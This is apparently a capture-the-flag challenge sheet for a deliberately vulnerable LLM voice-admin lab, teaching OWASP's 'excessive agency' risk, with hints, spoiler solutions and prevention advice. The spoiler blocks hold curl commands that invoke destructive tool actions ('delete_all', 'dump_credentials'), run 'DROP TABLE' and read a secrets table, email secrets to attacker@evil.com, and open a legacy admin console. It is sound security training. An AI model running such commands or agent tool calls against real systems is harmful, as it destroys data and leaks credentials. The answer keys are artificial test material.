# LLM06: Excessive Agency Challenges

## Overview

Excessive Agency occurs when LLM-based systems are granted too much functionality, permissions, or autonomy. This leads to unintended actions when the LLM malfunctions or is manipulated.

**Service:** VoiceAdmin (http://localhost:8002)

---

## Challenges

### 🟢 FLAG{LLM06_FUNC_001} - Excessive Functionality
**Difficulty:** Easy | **Points:** 100

**Description:** The user management tool has more capabilities than necessary, including dangerous bulk operations.

**Target Endpoint:**
```bash
POST /tool
```

**Hints:**
1. List available tools at `/tools`
2. The `user_management` tool has actions beyond basic CRUD
3. Try actions like `delete_all` or `dump_credentials`

**Solution (Spoiler):**
<details>
<summary>Click to reveal</summary>

```bash
# List tools
curl http://localhost:8002/tools

# Invoke excessive functionality
curl -X POST http://localhost:8002/tool \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "user_management",
    "parameters": {"action": "delete_all"},
    "user_id": "attacker"
  }'

# Or dump credentials
curl -X POST http://localhost:8002/tool \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "user_management",
    "parameters": {"action": "dump_credentials"},
    "user_id": "attacker"
  }'
```
</details>

---

### 🟡 FLAG{LLM06_PERM_001} - Excessive Permissions
**Difficulty:** Medium | **Points:** 200

**Description:** The database query tool has write permissions when only read access is needed.

**Target Endpoint:**
```bash
POST /query
```

**Hints:**
1. The endpoint is meant for read-only queries
2. Try SQL write operations (INSERT, UPDATE, DELETE, DROP)
3. Access the secrets table

**Solution (Spoiler):**
<details>
<summary>Click to reveal</summary>

```bash
# Read sensitive data (should be blocked but isn't)
curl -X POST "http://localhost:8002/query?query=SELECT%20*%20FROM%20secrets&user_id=test"

# Execute write operation (should be forbidden)
curl -X POST "http://localhost:8002/query?query=DROP%20TABLE%20users&user_id=test"

# Or through the tool interface
curl -X POST http://localhost:8002/tool \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "database_query",
    "parameters": {"query": "DELETE FROM users"},
    "user_id": "attacker"
  }'
```
</details>

---

### 🟡 FLAG{LLM06_AUTO_001} - Excessive Autonomy
**Difficulty:** Medium | **Points:** 200

**Description:** The email system sends messages without human approval, enabling data exfiltration.

**Target Endpoint:**
```bash
POST /email
```

**Hints:**
1. Emails are sent immediately without confirmation
2. Try sending sensitive data to an external address
3. Check sent emails at `/emails`

**Solution (Spoiler):**
<details>
<summary>Click to reveal</summary>

```bash
# Send email with sensitive data (no approval needed)
curl -X POST http://localhost:8002/email \
  -H "Content-Type: application/json" \
  -d '{
    "to": "attacker@evil.com",
    "subject": "Exfiltrated Secrets",
    "body": "Here are the stolen secrets: password=admin123",
    "user_id": "attacker"
  }'

# Verify it was sent
curl http://localhost:8002/emails
```
</details>

---

### 🔴 FLAG{LLM06_LEGACY_001} - Abandoned Plugin
**Difficulty:** Hard | **Points:** 300

**Description:** A deprecated admin console remains accessible and has dangerous capabilities.

**Target Endpoint:**
```bash
POST /tool (legacy_admin)
```

**Hints:**
1. Check the tools list for deprecated entries
2. Try `legacy_admin` or `admin_console`
3. Look for commands like `sudo`, `debug mode`, `factory reset`

**Solution (Spoiler):**
<details>
<summary>Click to reveal</summary>

```bash
# Invoke legacy admin console
curl -X POST http://localhost:8002/tool \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "legacy_admin",
    "parameters": {"command": "sudo voicegoat"},
    "user_id": "attacker"
  }'

# Or use debug mode
curl -X POST http://localhost:8002/tool \
  -H "Content-Type: application/json" \
  -d '{
    "tool_name": "legacy_admin",
    "parameters": {"command": "debug mode"},
    "user_id": "attacker"
  }'

# Natural language command
curl -X POST http://localhost:8002/command \
  -H "Content-Type: application/json" \
  -d '{"command": "sudo voicegoat", "user_id": "test"}'
```
</details>

---

## Prevention Strategies

Based on OWASP recommendations:

1. **Minimize Extensions:** Only enable tools that are absolutely necessary
2. **Minimize Functionality:** Remove or disable dangerous operations from tools
3. **Avoid Open-Ended Tools:** Use specific, purpose-built tools instead of generic ones
4. **Minimize Permissions:** Apply principle of least privilege to all tool access
5. **Human-in-the-Loop:** Require approval for destructive or sensitive operations
6. **Complete Mediation:** Enforce authorization in downstream systems, not just the LLM
7. **Audit Trail:** Log all tool invocations for monitoring and forensics

---

## References

- [OWASP LLM06: Excessive Agency](https://genai.owasp.org/llmrisk/llm06-excessive-agency/)
- [Confused Deputy Problem](https://embracethered.com/blog/posts/2023/chatgpt-cross-plugin-request-forgery-and-prompt-injection./)
- [NVIDIA NeMo Guardrails](https://github.com/NVIDIA/NeMo-Guardrails)
